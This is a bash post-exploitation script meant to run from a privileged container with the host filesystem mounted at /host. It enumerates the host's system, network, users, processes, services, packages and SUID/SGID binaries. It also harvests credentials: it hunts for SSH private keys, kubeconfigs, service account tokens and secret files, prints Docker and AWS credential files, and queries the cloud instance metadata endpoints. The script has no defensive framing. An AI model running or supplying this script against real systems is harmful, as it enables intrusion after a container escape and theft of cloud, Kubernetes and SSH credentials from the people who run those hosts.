#!/bin/bash
# Comprehensive Host System Enumeration
# Run from privileged container with /host mount

echo "=========================================="
echo "  HOST SYSTEM ENUMERATION"
echo "=========================================="
echo ""

echo "=== 1. SYSTEM INFORMATION ==="
echo "[*] Operating System:"
chroot /host cat /etc/os-release 2>/dev/null | head -10
echo ""

echo "[*] Kernel Version:"
chroot /host uname -a 2>/dev/null
echo ""

echo "[*] Hostname:"
chroot /host hostname 2>/dev/null
echo ""

echo "[*] Uptime:"
chroot /host uptime 2>/dev/null
echo ""

echo "[*] CPU Information:"
chroot /host cat /proc/cpuinfo 2>/dev/null | grep -E "(model name|processor)" | head -5
echo ""

echo "[*] Memory Information:"
chroot /host free -h 2>/dev/null
echo ""

echo "=== 2. NETWORK CONFIGURATION ==="
echo "[*] Network Interfaces:"
chroot /host ip addr show 2>/dev/null || chroot /host ifconfig 2>/dev/null | head -30
echo ""

echo "[*] Routing Table:"
chroot /host ip route 2>/dev/null || chroot /host route -n 2>/dev/null
echo ""

echo "[*] ARP Table:"
chroot /host ip neigh show 2>/dev/null || chroot /host arp -a 2>/dev/null | head -20
echo ""

echo "[*] Listening Ports (from /proc/net/tcp):"
chroot /host cat /proc/net/tcp 2>/dev/null | awk '{print $2, $10}' | head -20
echo ""

echo "[*] DNS Configuration:"
chroot /host cat /etc/resolv.conf 2>/dev/null
echo ""

echo "=== 3. USERS AND GROUPS ==="
echo "[*] /etc/passwd:"
chroot /host cat /etc/passwd 2>/dev/null
echo ""

echo "[*] /etc/group (first 30 lines):"
chroot /host cat /etc/group 2>/dev/null | head -30
echo ""

echo "[*] Currently logged in users:"
chroot /host who 2>/dev/null || chroot /host w 2>/dev/null | head -10
echo ""

echo "[*] Last logged in users:"
chroot /host last 2>/dev/null | head -10
echo ""

echo "=== 4. RUNNING PROCESSES ==="
echo "[*] Top processes:"
chroot /host ps aux 2>/dev/null | head -20
echo ""

echo "[*] Process tree:"
chroot /host pstree 2>/dev/null | head -30 || echo "pstree not available"
echo ""

echo "=== 5. SERVICES AND SYSTEMD ==="
echo "[*] Running systemd services:"
chroot /host systemctl list-units --type=service --state=running 2>/dev/null | head -30
echo ""

echo "[*] Enabled services:"
chroot /host systemctl list-unit-files --type=service --state=enabled 2>/dev/null | head -30
echo ""

echo "=== 6. DOCKER/KUBERNETES COMPONENTS ==="
echo "[*] Docker version:"
chroot /host docker --version 2>/dev/null || echo "Docker CLI not found"
echo ""

echo "[*] Docker containers on host:"
chroot /host docker ps -a 2>/dev/null | head -20 || echo "Cannot list containers"
echo ""

echo "[*] Kubernetes components:"
ls -la /host/var/lib/kubelet/ 2>/dev/null | head -10 || echo "Kubelet directory not found"
ls -la /host/etc/kubernetes/ 2>/dev/null | head -10 || echo "Kubernetes config not found"
echo ""

echo "[*] Container runtime sockets:"
find /host -name "*.sock" -path "*/docker*" -o -path "*/containerd*" -o -path "*/crio*" 2>/dev/null | head -10
echo ""

echo "=== 7. INSTALLED SOFTWARE ==="
echo "[*] Installed packages (dpkg/apt):"
chroot /host dpkg -l 2>/dev/null | head -30 || echo "dpkg not available"
echo ""

echo "[*] Installed packages (rpm/yum):"
chroot /host rpm -qa 2>/dev/null | head -30 || echo "rpm not available"
echo ""

echo "=== 8. FILE SYSTEM ==="
echo "[*] Mounted filesystems:"
chroot /host mount 2>/dev/null | head -20
echo ""

echo "[*] Disk usage:"
chroot /host df -h 2>/dev/null | head -20
echo ""

echo "[*] Large directories:"
chroot /host du -h / 2>/dev/null | sort -rh | head -20 || echo "du not available"
echo ""

echo "=== 9. CREDENTIALS AND SENSITIVE FILES ==="
echo "[*] SSH keys:"
find /host -name "id_rsa" -o -name "id_ed25519" -o -name "id_ecdsa" 2>/dev/null | head -10
echo ""

echo "[*] Docker config:"
chroot /host cat /root/.docker/config.json 2>/dev/null || echo "No Docker config found"
find /host/home -name ".docker" -type d 2>/dev/null | head -5
echo ""

echo "[*] Kubernetes configs:"
find /host -path "*/.kube/config" -o -path "*/kubeconfig" 2>/dev/null | head -10
echo ""

echo "[*] Service account tokens:"
find /host -path "*/serviceaccount/token" 2>/dev/null | head -10
echo ""

echo "[*] AWS credentials:"
find /host -name ".aws" -type d 2>/dev/null | head -5
chroot /host cat /root/.aws/credentials 2>/dev/null 2>/dev/null || echo "No AWS credentials found"
echo ""

echo "[*] Environment files with secrets:"
find /host -name ".env" -o -name "*.key" -o -name "*secret*" 2>/dev/null | grep -v "/proc\|/sys" | head -20
echo ""

echo "=== 10. SCHEDULED TASKS ==="
echo "[*] Crontab:"
chroot /host cat /etc/crontab 2>/dev/null
echo ""

echo "[*] User crontabs:"
chroot /host ls -la /var/spool/cron/crontabs/ 2>/dev/null || chroot /host ls -la /var/spool/cron/ 2>/dev/null | head -10
echo ""

echo "[*] Systemd timers:"
chroot /host systemctl list-timers 2>/dev/null | head -20
echo ""

echo "=== 11. LOG FILES ==="
echo "[*] Recent auth logs:"
chroot /host tail -20 /var/log/auth.log 2>/dev/null || chroot /host tail -20 /var/log/secure 2>/dev/null || echo "Auth logs not accessible"
echo ""

echo "[*] Recent syslog:"
chroot /host tail -20 /var/log/syslog 2>/dev/null || chroot /host tail -20 /var/log/messages 2>/dev/null | head -20
echo ""

echo "=== 12. CLOUD PROVIDER METADATA ==="
echo "[*] Checking AWS metadata:"
curl -s --max-time 2 http://169.254.169.254/latest/meta-data/ 2>/dev/null | head -10 || echo "Not AWS"
echo ""

echo "[*] Checking GCP metadata:"
curl -s --max-time 2 -H "Metadata-Flavor: Google" http://169.254.169.254/computeMetadata/v1/ 2>/dev/null | head -10 || echo "Not GCP"
echo ""

echo "[*] Checking Azure metadata:"
curl -s --max-time 2 -H "Metadata: true" http://169.254.169.254/metadata/instance?api-version=2021-02-01 2>/dev/null | head -10 || echo "Not Azure"
echo ""

echo "=== 13. NETWORK CONNECTIONS ==="
echo "[*] Active network connections:"
chroot /host netstat -tulpn 2>/dev/null | head -30 || chroot /host ss -tulpn 2>/dev/null | head -30
echo ""

echo "=== 14. SUID/SGID BINARIES ==="
echo "[*] SUID binaries:"
find /host -perm -4000 -type f 2>/dev/null | head -20
echo ""

echo "[*] SGID binaries:"
find /host -perm -2000 -type f 2>/dev/null | head -20
echo ""

echo "=========================================="
echo "  ENUMERATION COMPLETE"
echo "=========================================="
